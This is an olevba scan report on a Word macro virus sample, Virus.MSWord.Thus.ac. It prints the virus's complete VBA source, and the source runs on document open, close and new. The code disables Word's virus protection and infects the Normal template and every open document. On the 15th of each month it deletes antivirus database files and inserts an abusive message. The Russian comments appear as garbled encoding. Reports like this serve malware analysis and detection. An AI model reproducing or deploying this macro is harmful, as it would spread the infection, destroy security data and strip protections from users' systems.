olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.ac-defca490ddb68af37bd051614f0fd945ae3db1d0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.ac-defca490ddb68af37bd051614f0fd945ae3db1d0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Anti AVP&DrWEB 2.0'
'Ëèöåíçèîííîå ñîãëàøåíèå:
'   Äàííûé âèðóñ ðàñïðîñòðàíÿåòñÿ áåñïëàòíî
'   ïî ñõåìå AS IS (êàê åñòü).
'   Íèêàêèõ îãðàíè÷åíèé íà ðàñïðîñòðàíåíèå, òèðàæèðîâàíèå,
'   êîïèðîâàíèå è ïîëó÷åíèå ïðèáûëè íå ñóùåñòâóåò.
'   Äëÿ åãî îòñëåæèâàíèÿ è ëå÷åíèÿ âàì íåîáõîäèìî îáðàòèòüñÿ:
'   â àíòèâèðóñíóþ ëàáîðàòîðèþ È. Äàíèëîâà ("Äèàëîã - Íàóêà")
'
'   Àäðåñ: 117786, Ìîñêâà, óë. Âàâèëîâà 40, îôèñ 102.
'   Ïðîåçä: ñò. ìåòðî "Ëåíèíñêèé ïðîñïåêò" (âûõîä ê óë. Îðäæîíèêèäçå), äàëåå ëþáûì òðàìâàåì äî îñòàíîâêè "Óëèöà Ãóáêèíà" (4-ÿ îñòàíîâêà â ñòîðîíó ñò. ìåòðî "Óíèâåðñèòåò").
'   Ïðîñüáà îáðàùàòüñÿ ñ 10 äî 18 ÷àñîâ ïî ðàáî÷èì äíÿì.
'   Òåë.: (095) 135-6253, 137-0150
'   Òåë./ôàêñ: (095) 938-2970
'   BBS (êðóãëîñóòî÷íûå ëèíèè):
'
'   (095) 938-2856 (28800/V.34) - ëèíèÿ îáùåãî äîñòóïà;
'   (095) 938-2867 (28800/V.34, 33600/V.34+) – ïîäïèñ÷èêè;
'   (095) 938-2969 (28800/V.34, 33600/V.34+) – ïîäïèñ÷èêè;
'   (095) 939-3705 (28800/V.34, 33600/V.34+) – ïîäïèñ÷èêè;
'   (095) 939-5239 (28800/V.34, 33600/V.34+) – ïîäïèñ÷èêè.
'
'   FidoNet: 2:5020/69
'   E-mail: Antivir@DialogNauka.ru - çàìå÷àíèÿ, ïîæåëàíèÿ, ïîñòàâêè, îáñëóæèâàíèå, ïåðåäà÷à íîâûõ âèðóñîâ
'   Ñåðâåð WWW: http://www.DialogNauka.ru
'
'   Ñåðâåðû FTP: ftp://ftp.DialoNauka.ru,   ftp://ftp2.DialogNauka.ru,   
'   ftp://ftp3.DialogNauka.ru
'
    Dim K As Long
    Dim C As Long
    Dim S As String
    Dim f As Boolean
    On Error Resume Next
    Application.Options.VirusProtection = False
    f = Application.Options.SaveNormalPrompt
    Application.Options.SaveNormalPrompt = False
    If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1) <> "'Anti AVP&DrWEB 2.0'" Then
        C = Application.ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        S = Application.ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, C)
        K = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, K
        NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, S
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    Application.Options.SaveNormalPrompt = f
    For K = 1 To Application.Documents.Count
        If Application.Documents.Item(K).VBProject.VBComponents(1).CodeModule.Lines(2, 1) <> "'Anti AVP&DrWEB 2.0'" Then
            C = Application.Documents.Item(K).VBProject.VBComponents(1).CodeModule.CountOfLines
            Application.Documents.Item(K).VBProject.VBComponents(1).CodeModule.DeleteLines 1, C
            C = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
            S = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, C)
            Application.Documents.Item(K).VBProject.VBComponents(1).CodeModule.InsertLines 1, S
        End If
    Next K
    'Ñåðåäèíà ìåñÿöà
    If Day(Now()) = 15 Then
        With Application.FileSearch
            .NewSearch
            .MatchTextExactly = False
            .LookIn = "C:\"
            .SearchSubFolders = True
            .FileName = "*.vdb"
            .FileType = msoFileTypeAllFiles
            If .Execute > 0 Then
                For K = 1 To .FoundFiles.Count
                    S = .FoundFiles(K)
                    Kill S
                Next K
            End If
        End With
        With Application.FileSearch
            .NewSearch
            .MatchTextExactly = False
            .LookIn = "C:\"
            .SearchSubFolders = True
            .FileName = "*.avc"
            .FileType = msoFileTypeAllFiles
            If .Execute > 0 Then
                For K = 1 To .FoundFiles.Count
                    S = .FoundFiles(K)
                    Kill S
                Next K
            End If
        End With
        With Selection
            .Font.Size = 36
            .Font.ColorIndex = wdRed
            .ParagraphFormat.Alignment = wdAlignParagraphCenter
            .TypeText "I Fuck AVP & DrWeb!!!"
            .TypeParagraph
            .Font.Size = 12
            .Font.ColorIndex = wdBlack
            .TypeText "Äëÿ òîãî, ÷òîáû ïîëíîñòüþ çàùèòèòü ñåáÿ îò âèðóñîâ - íåîáõîäèìî âàø êîìïüþòåð çàëèòü áåòîíîì, çàâàðèòü àðìàòóðîé, ñâåðõó íàòÿíóòü ïðåçåðâàòèâ è íè êàêèõ ïîëîâûõ ñâÿçåé ñ äèñêåòàìè !!!. À ýòî - âñåãî ëèøü åùå îäíà ãîëîâíàÿ áîëü äëÿ Èãîðÿ Äàíèëîâà (Èãîðü, Sorry, íî ìíå òàê õîòåëîñü, ÷òîáû òû ìåíÿ çàìåòèë è âêëþ÷èë â ñâîè ìåìóàðû â âèäå âèðóñíûõ áàç.) À âîîáùå, åñëè ÷åñòíî, DrWeb - îäèí èç ëó÷øèõ àíòèâèðóñîâ â Ðîññèè (æàëü òîëüêî ðàñïðîñòðàíÿåòñÿ ïëàòíî). Íó âîò, íàâåðíî è âñå... Áóäåò ñêó÷íî - øëèòå äåíüãè :-)"
            .TypeParagraph
        End With
    End If
End Sub

Private Sub Document_Close()
    Document_Open
End Sub

Private Sub Document_New()
   Document_Open
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |http://www.DialogNau|URL                                          |
|          |ka.ru               |                                             |
|IOC       |ftp://ftp.DialoNauka|URL                                          |
|          |.ru                 |                                             |
|IOC       |ftp://ftp2.DialogNau|URL                                          |
|          |ka.ru               |                                             |
|IOC       |ftp://ftp3.DialogNau|URL                                          |
|          |ka.ru               |                                             |
+----------+--------------------+---------------------------------------------+

